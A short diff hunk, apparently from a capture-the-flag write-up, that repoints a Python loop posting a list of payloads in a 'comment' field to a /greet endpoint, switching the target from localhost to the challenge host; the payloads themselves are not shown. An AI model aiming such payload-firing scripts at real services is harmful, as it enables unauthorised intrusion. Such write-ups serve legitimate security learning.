@@ -66,7 +66,7 @@ payloads = [
 ]
 
 for i in payloads:
-    resp=requests.post("http://127.0.0.1:8000/greet",data={"comment":i})
+    resp=requests.post("http://golf.c1.blahaj.sg/greet",data={"comment":i})
     print(resp.content)
 ```
 
